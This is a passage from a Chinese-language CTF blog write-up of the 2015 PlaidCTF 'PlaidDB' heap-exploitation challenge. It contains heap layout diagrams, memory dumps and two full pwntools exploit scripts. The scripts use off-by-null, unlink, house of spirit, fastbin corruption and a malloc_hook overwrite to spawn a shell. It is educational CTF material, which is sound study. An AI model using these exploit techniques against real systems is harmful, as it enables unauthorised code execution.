+<pre><code> +------------+ 0x0f0 - 0x10
+ |    0x40    | node &#39;KEY1&#39;
+ +------------+ 0x130 - 0x10
+ |    0x20    | &#39;&#39;
+ +------------+ 0x150 - 0x10
+ |    0x20    | &#39;LEAKBUF&#39;
+ +------------+ 0x170 - 0x10
+ |    0x40    | [freed]
+ +------------+ 0x1b0 - 0x10
+ |    0x20    | [freed]
+ +------------+ 0x1d0 - 0x10
+ |   0x3f0    | chunk
+ +---- :: ----+ 0x260 - 0x10
+ |     ::     | [freed]
+ +---- :: ----+ 0x2a0 - 0x10
+ |     ::     | [freed]
+ +---- :: ----+ 0x2c0 - 0x10
+ |     ::     | [freed]
+ +---- :: ----+ 0x2e0 - 0x10
+ |   [0x40]   | node &#39;LEAKBUF&#39;
+ +---- :: ----+ 0x320 - 0x10
+ |   [0x20]   | [freed]
+ +---- :: ----+ 0x340 - 0x10
+ |   [0x20]   | &#39;KEY1&#39; =&gt; fake_chunk_addr
+ +---- :: ----+ 0x360 - 0x10
+ |     ::     | [freed]
+ +---- :: ----+ 0x3a0 - 0x10
+ |     ::     | [freed]
+ +---- :: ----+ 0x3c0 - 0x10
+ |   [0x40]   | &#39;X&#39; * 0xf8 =&gt; &#39;P\x00&#39; =&gt; &#39;A&#39; * 0x40 + gadgets
+ +---- :: ----+ 0x4c0 - 0x10
+ |     ::     | [freed]
+ +------------+ 0x5c0 - 0x10
+ |    0x20    | &#39;C&#39; * 0x18
+ +------------+
+</code></pre><p>最后用 PUT 里的任意大小 malloc 取一个大小为 56 的 chunk。前面构造的 fd 指针位置指向读进去的 data_size 存储的位置，因为程序用的是 strtoul，所以送出去的字符串都会被存在栈上，就能构造一个大小合适的 chunk。为了绕过对 main_arena 的检查，把 fake chunk 的 IS_MMAP 标志位开启：</p>
+<pre><code class="python">cmd(&#39;PUT&#39;)
+p.recvuntil(&#39;Enter row key:&#39;)
+p.sendline(&#39;KEY1&#39;)
+p.recvuntil(&#39;Enter data size:&#39;)
+p.send(&#39;56&#39;.ljust(8, &#39; &#39;) + p64(0x42))
+p.recvuntil(&#39;PROMPT: Enter data:&#39;)
+p.send((&#39;A&#39; * 7 + p64(canary) + &#39;A&#39; * 0x10 + p64(fake_rbp) + p64(leave_ret)).ljust(55, &#39;A&#39;))
+</code></pre>
+<p>最后送 data 的时候不是补成 55 是因为前面用 fgets 读 data_size 的时候最后面多补了个 <code>&quot;\x00&quot;</code>：</p>
+<pre><code>0x7fff7e985540: 0x2020202020203635      0x0000000000000042
+0x7fff7e985550: 0x4141414141414100      0xa5f15260d1090900
+0x7fff7e985560: 0x4141414141414141      0x4141414141414141
+0x7fff7e985570: 0x00005560f2703418      0x00007ff1b1cc9a9e
+0x7fff7e985580: 0x4141414141414141      0xa5f15260d1090900
+</code></pre><p>在 CTF-Wiki 上还有另外一种更简洁的做法，先造一堆 fastbin，接着构造 chunk。最后用 fastbin attack 改 malloc_hook：</p>
+<pre><code>datastore-&gt;malloc(56)             = 0x55ac13f22010
+datastore-&gt;malloc(8)              = 0x55ac13f22050
+datastore-&gt;malloc(9)              = 0x55ac13f22070
+datastore-&gt;malloc(56)             = 0x55ac13f22090 =&gt; &#39;X&#39; * 0x200
+datastore-&gt;malloc(8)              = 0x55ac13f220d0
+datastore-&gt;malloc(56)             = 0x55ac13f220f0
+datastore-&gt;malloc(56)             = 0x55ac13f22130
+datastore-&gt;malloc(8)              = 0x55ac13f22170
+datastore-&gt;malloc(56)             = 0x55ac13f22190
+datastore-&gt;malloc(56)             = 0x55ac13f221d0
+datastore-&gt;malloc(8)              = 0x55ac13f22210
+datastore-&gt;malloc(56)             = 0x55ac13f22230
+datastore-&gt;malloc(56)             = 0x55ac13f22270
+datastore-&gt;malloc(8)              = 0x55ac13f222b0
+datastore-&gt;malloc(56)             = 0x55ac13f222d0
+datastore-&gt;malloc(56)             = 0x55ac13f22310
+datastore-&gt;malloc(8)              = 0x55ac13f22350
+datastore-&gt;malloc(56)             = 0x55ac13f22370
+datastore-&gt;malloc(56)             = 0x55ac13f223b0
+datastore-&gt;malloc(8)              = 0x55ac13f223f0 =&gt; &#39;6&#39;
+datastore-&gt;malloc(56)             = 0x55ac13f22410
+datastore-&gt;malloc(56)             = 0x55ac13f22450
+datastore-&gt;malloc(8)              = 0x55ac13f22490 =&gt; &#39;4&#39; =&gt; [freed] =&gt; &#39;fillup2&#39;
+datastore-&gt;malloc(56)             = 0x55ac13f224b0 =&gt; [freed] =&gt; node &#39;fillup2&#39;
+datastore-&gt;malloc(56)             = 0x55ac13f224f0 =&gt; node &#39;4&#39; =&gt; [freed] =&gt; node &#39;fillup1&#39;
+datastore-&gt;malloc(8)              = 0x55ac13f22530 =&gt; &#39;3&#39; =&gt; [freed]
+datastore-&gt;malloc(56)             = 0x55ac13f22550 =&gt; node &#39;6&#39;
+datastore-&gt;malloc(56)             = 0x55ac13f22590 =&gt; node &#39;5&#39; =&gt; [freed]
+datastore-&gt;malloc(8)              = 0x55ac13f225d0 =&gt; &#39;5&#39; =&gt; [freed]
+datastore-&gt;malloc(56)             = 0x55ac13f225f0 =&gt; node &#39;3&#39; =&gt; [freed]
+datastore-&gt;malloc(56)             = 0x55ac13f22630 =&gt; node &#39;1&#39; =&gt; [freed]
+datastore-&gt;malloc(8)              = 0x55ac13f22670 =&gt; &#39;2&#39;
+datastore-&gt;malloc(56)             = 0x55ac13f22690 =&gt; node &#39;2&#39;
+datastore-&gt;malloc(8)              = 0x55ac13f226d0 =&gt; &#39;1&#39; =&gt; [freed] =&gt; &#39;fillup1&#39;
+datastore-&gt;malloc(512)            = 0x55ac13f226f0 =&gt; &#39;1&#39; * 0x200 =&gt; [freed] &lt;= unlink pointer =&gt; &#39;X&#39; * 0x200
+datastore-&gt;malloc(80)             = 0x55ac13f22900 =&gt; &#39;2&#39; * 0x50
+datastore-&gt;malloc(104)            = 0x55ac13f22960 =&gt; &#39;5&#39; * 0x68 =&gt; [freed] &lt;= overlap fd
+datastore-&gt;malloc(504)            = 0x55ac13f229d0 =&gt; &#39;3&#39; * 0x1f8 =&gt; [freed] =&gt; &#39;A&#39; * 0x1f0 + p64(0xdb0 - 0x6f0)
+datastore-&gt;malloc(240)            = 0x55ac13f22bd0 =&gt; &#39;4&#39; * 0xf0 =&gt; [freed]
+datastore-&gt;malloc(1024)           = 0x55ac13f22cd0 =&gt; &#39;6&#39; * 0x400
+</code></pre><h1 id="Exploit-Script"><a href="#Exploit-Script" class="headerlink" title="Exploit Script"></a>Exploit Script</h1><p>第一种方法的 Exploit 主要是跟着 Winesap 做的：</p>
+<pre><code class="python">#!/usr/bin/env python
+from pwn import *
+
+context.arch = &#39;amd64&#39;
+context.log_level = &#39;debug&#39;
+
+local = 0
+if local:
+    p = process(&#39;./datastore&#39;)
+    libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
+else:
+    p = remote(&#39;127.0.0.1&#39;, 4000)
+    libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
+
+def cmd(c):
+    p.recvuntil(&#39;Enter command:&#39;)
+    p.sendline(c)
+
+def PUT(key, data):
+    cmd(&#39;PUT&#39;)
+    p.recvuntil(&#39;Enter row key:&#39;)
+    p.sendline(key)
+    p.recvuntil(&#39;Enter data size:&#39;)
+    p.sendline(str(len(data)))
+    p.recvuntil(&#39;PROMPT: Enter data:&#39;)
+    p.send(data)
+
+def DEL(key):
+    cmd(&#39;DEL&#39;)
+    p.recvuntil(&#39;Enter row key:&#39;)
+    p.sendline(key)
+
+def GET(key):
+    cmd(&#39;GET&#39;)
+    p.recvuntil(&#39;Enter row key:&#39;)
+    p.sendline(key)
+    p.recvuntil(&#39; bytes]:\n&#39;)
+    return p.recvuntil(&#39;PROMPT: &#39;)[:-8]
+
+PUT(&#39;MMAP&#39;, &#39;Z&#39; * 0x21000)
+# Off by Null + Unlink
+PUT(&#39;3&#39;, &#39;&#39;)
+PUT(&#39;0&#39;, &#39;C&#39; * 0x80) # smallbin for unlink
+PUT(&#39;1&#39;, &#39;&#39;) # chunk for overflow
+PUT(&#39;2&#39;, &#39;&#39;)
+PUT(&#39;1&#39;, &#39;A&#39; * 0xf8)
+PUT(&#39;2&#39;, &#39;B&#39; * 0xf8 + p64(0x21) + &#39;C&#39; * 0x18) # chunk for off-by-null ; fake a fastbin
+DEL(&#39;1&#39;)
+DEL(&#39;X&#39; * 240 + p64(0x4c0 - 0x1d0)) # off-by-null(shrink) ; set prev_size
+DEL(&#39;0&#39;)
+DEL(&#39;2&#39;) # unlink
+#raw_input(&#39;@&#39;)
+
+# Leak Heap Address
+DEL(&#39;3&#39;) # put a previous node chunk into fastbin
+PUT(&#39;KEY1&#39;, (&#39;A&#39; * 0x108 +
+    p64(0x40) + p64(0) + &#39;D&#39; * 0x30 +
+    p64(0x21) + p64(0) + &#39;C&#39; * 0x10 +
+    p64(0x21) + &#39;KEY1\x00&#39;).ljust(1000, &#39;Q&#39;)
+)
+PUT(&#39;LEAKBUF&#39;, &#39;&#39;)
+data = GET(&#39;KEY1&#39;)
+heap_base = u64(data[0x110:0x118]) - 0x150
+info(&#39;heap_base = &#39; + hex(heap_base))
+#raw_input(&#39;@&#39;)
+
+# Function for Leaking Memory
+def leak(addr, size):
+    PUT(&#39;KEY1&#39;, &#39;A&#39; * 0x3e8)
+    PUT(&#39;KEY1&#39;, data[:0x118] + p64(size) + p64(addr) + data[0x128:])
+    return GET(&#39;LEAKBUF&#39;)
+
+mmap_chunk = u64(leak(heap_base + 0xa0, 8)) - 0x10
+info(&#39;mmap_chunk = &#39; + hex(mmap_chunk))
+libc_base = u64(leak(mmap_chunk + 0x22000 + 0x750, 8)) - 0x5dc740
+info(&#39;libc_base = &#39; + hex(libc_base))
+canary = u64(leak(mmap_chunk + 0x22000 + 0x768, 8))
+info(&#39;canary = &#39; + hex(canary))
+stack_addr = u64(leak(mmap_chunk + 0x22000 + 0xa40, 8))
+info(&#39;stack_addr = &#39; + hex(stack_addr))
+#raw_input(&#39;@&#39;)
+
+# find Gadgets &amp; Buffer
+pop_rdi_ret = libc_base + libc.search(asm(&#39;pop rdi ; ret&#39;)).next()
+leave_ret = libc_base + libc.search(asm(&#39;leave ; ret&#39;)).next()
+system_addr = libc_base + libc.symbols[&#39;system&#39;]
+bin_sh_addr = libc_base + libc.search(&#39;/bin/sh&#39;).next()
+info(&#39;pop_rdi_ret = &#39; + hex(pop_rdi_ret))
+info(&#39;leave_ret = &#39; + hex(leave_ret))
+info(&#39;system_addr = &#39; + hex(system_addr))
+info(&#39;bin_sh_addr = &#39; + hex(bin_sh_addr))
+fake_chunk_addr = stack_addr - 0x90
+fake_rbp = heap_base + 0x420 - 8
+#raw_input(&#39;@&#39;)
+
+# House of Spirit + Fastbin Corruption + ROP
+PUT(&#39;KEY1&#39;, &#39;A&#39; * 0x3e8)
+PUT(&#39;KEY1&#39;, (&#39;A&#39; * 0x108 +
+    p64(0x40) + p64(heap_base + 0x3e0) + # point LEAKBUF&#39;s key to &#39;P\x00&#39;
+    p64(0x64) + p64(0) + p64(0) + p64(0) + p64(0) +
+    p64(0x40) + p64(0x40) + &#39;KEY1\x00&#39;.ljust(0x38, &#39;A&#39;) + # 0x358
+    p64(0x40) + &#39;A&#39; * 0x78 + # 0x3d8
+    p64(0x40) + &#39;P\x00&#39;.ljust(0x38, &#39;A&#39;) + p64(0x41)).ljust(0x3e8, &#39;Q&#39;)
+)
+DEL(&#39;P&#39;) # house of spirit
+DEL(&#39;KEY1&#39;)
+#raw_input(&#39;@&#39;)
+PUT(&#39;KEY1&#39;, (&#39;A&#39; * 0x108 +
+    p64(0x40) + p64(heap_base + 0x3e0) +
+    p64(0x64) + p64(0) + p64(0) + p64(0) + p64(0) +
+    p64(0x40) + p64(0x40) + p64(fake_chunk_addr) + &#39;A&#39; * 0x30 +
+    p64(0x40) + &#39;A&#39; * 0x78 + # 0x3d8
+    p64(0x40) + &#39;A&#39; * 0x40 + # 0x420
+    p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)).ljust(0x3e8, &#39;Q&#39;) # place gadgets
+) # fastbin corruption
+#raw_input(&#39;@&#39;)
+
+cmd(&#39;PUT&#39;)
+p.recvuntil(&#39;Enter row key:&#39;)
+p.sendline(&#39;KEY1&#39;)
+p.recvuntil(&#39;Enter data size:&#39;)
+p.send(&#39;56&#39;.ljust(8, &#39; &#39;) + p64(0x42))
+p.recvuntil(&#39;PROMPT: Enter data:&#39;)
+#raw_input(&#39;@&#39;)
+p.send((&#39;A&#39; * 7 + p64(canary) + &#39;A&#39; * 0x10 + p64(fake_rbp) + p64(leave_ret)).ljust(55, &#39;A&#39;))
+p.recvuntil(&#39;INFO: Update successful.\n&#39;)
+
+p.interactive()
+</code></pre>
+<p>另一种做法：</p>
+<pre><code class="python">#!/usr/bin/env python
+from pwn import *
+
+context.arch = &#39;amd64&#39;
+context.log_level = &#39;debug&#39;
+
+local = 1
+if local:
+    p = process(&#39;./datastore&#39;)
+    libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
+else:
+    p = remote(&#39;127.0.0.1&#39;, 4000)
+    libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
+
+def cmd(c):
+    p.recvuntil(&#39;Enter command:&#39;)
+    p.sendline(c)
+
+def PUT(key, data):
+    cmd(&#39;PUT&#39;)
+    p.recvuntil(&#39;Enter row key:&#39;)
+    p.sendline(key)
+    p.recvuntil(&#39;Enter data size:&#39;)
+    p.sendline(str(len(data)))
+    p.recvuntil(&#39;PROMPT: Enter data:&#39;)
+    p.send(data)
+
+def DEL(key):
+    cmd(&#39;DEL&#39;)
+    p.recvuntil(&#39;Enter row key:&#39;)
+    p.sendline(key)
+
+def GET(key):
+    cmd(&#39;GET&#39;)
+    p.recvuntil(&#39;Enter row key:&#39;)
+    p.sendline(key)
+    p.recvuntil(&#39; bytes]:\n&#39;)
+    return p.recvuntil(&#39;PROMPT: &#39;)[:-8]
+
+for i in range(10):
+    PUT(str(i), str(i) * 0x38)
+for i in range(10):
+    DEL(str(i))
+
+PUT(&#39;1&#39;, &#39;1&#39; * 0x200)
+PUT(&#39;2&#39;, &#39;2&#39; * 0x50)
+PUT(&#39;5&#39;, &#39;5&#39; * 0x68)
+PUT(&#39;3&#39;, &#39;3&#39; * 0x1f8)
+PUT(&#39;4&#39;, &#39;4&#39; * 0xf0)
+PUT(&#39;6&#39;, &#39;6&#39; * 0x400)
+DEL(&#39;5&#39;)
+DEL(&#39;3&#39;)
+DEL(&#39;1&#39;)
+DEL(&#39;A&#39; * 0x1f0 + p64(0xbd0 - 0x6f0)) # off-by-null + shrink
+DEL(&#39;4&#39;) # unlink
+PUT(&#39;fillup1&#39;, &#39;X&#39; * 0x200)
+PUT(&#39;fillup2&#39;, &#39;X&#39; * 0x200)
+data = GET(&#39;2&#39;)
+libc_base = u64(data[:8]) - 0x3c27b8
+info(&#39;libc_base = &#39; + hex(libc_base))
+#raw_input(&#39;@&#39;)
+
+free_hook = libc_base + libc.symbols[&#39;__free_hook&#39;]
+malloc_hook = libc_base + libc.symbols[&#39;__malloc_hook&#39;]
+system = libc_base + libc.symbols[&#39;system&#39;]
+one_gadgets = [0x46428, 0x4647c, 0xe9415, 0xea36d]
+one_gadget = libc_base + one_gadgets[1]
+info(&#39;one_gadget = &#39; + hex(one_gadget))
+PUT(&#39;fastatk&#39;, (&#39;A&#39; * 0x58 + p64(0x71) + p64(malloc_hook - 0x23)).ljust(0x100, &#39;\x00&#39;))
+PUT(&#39;X&#39;, &#39;X&#39; * 0x68)
+#raw_input(&#39;@&#39;)
+PUT(&#39;atk&#39;, (&#39;A&#39; * 0x13 + p64(one_gadget)).ljust(0x68, &#39;\x00&#39;))
+DEL(&#39;2&#39;)
+
+p.interactive()
+</code></pre>
+<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one-zh/#2-plaidctf-2015-plaiddb" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one-zh/#2-plaidctf-2015-plaiddb</a><br><a href="https://www.youtube.com/watch?v=jEHgm7S58N8" target="_blank" rel="noopener">https://www.youtube.com/watch?v=jEHgm7S58N8</a><br><a href="http://winesap.logdown.com/posts/261369-plaid-ctf-2015-plaiddb-writeup" target="_blank" rel="noopener">http://winesap.logdown.com/posts/261369-plaid-ctf-2015-plaiddb-writeup</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
+                    
+                      <a class="hover-with-bg" href="/tags/wp/">wp</a>
+                    
+                      <a class="hover-with-bg" href="/tags/pwn/">pwn</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2020/04/13/[TODO]Fuzzing-to-Exploit/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>Fuzzing to Exploit</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2020/04/06/A-Trip-of-Symbol-Resolution/">
+                        <span>A Trip of Symbol Resolution</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="http://blog.b3ale.cn" target="_blank" rel="nofollow noopener"><b>Hard Work Pays Off.</b></a>
+    </div>
+    
+  <div>
+    
+      <!-- 不蒜子统计PV -->
+      
+      <span id="busuanzi_container_site_pv" style="display: none">
+      总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    </span>
+    
+    
+      <!-- 不蒜子统计UV -->
+      
+      <span id="busuanzi_container_site_uv" style="display: none">
+      总访客数 <span id="busuanzi_value_site_uv"></span> 人
+    </span>
+    
+  </div>
+
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
+<script src="/js/main.js"></script>
+
+
+  <script src="/js/lazyload.js"></script>
+
+
+
+  
+  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "2015-PlaidCTF-PlaidDB&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+  
+
+  
+    <!-- MathJax -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+          tex2jax: {
+              inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+              processEscapes: true,
+              skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+          }
+      });
+
+      MathJax.Hub.Queue(function() {
+          var all = MathJax.Hub.getAllJax(), i;
+          for(i=0; i < all.length; i += 1) {
+              all[i].SourceElement().parentNode.className += ' has-jax';
+          }
+      });
+
+    </script>
+
+    <script src="https://cdn.staticfile.org/mathjax/2.7.7/MathJax.js?config=TeX-MML-AM_CHTML"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config("");
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="custom_mathjax_source">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+
+  
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
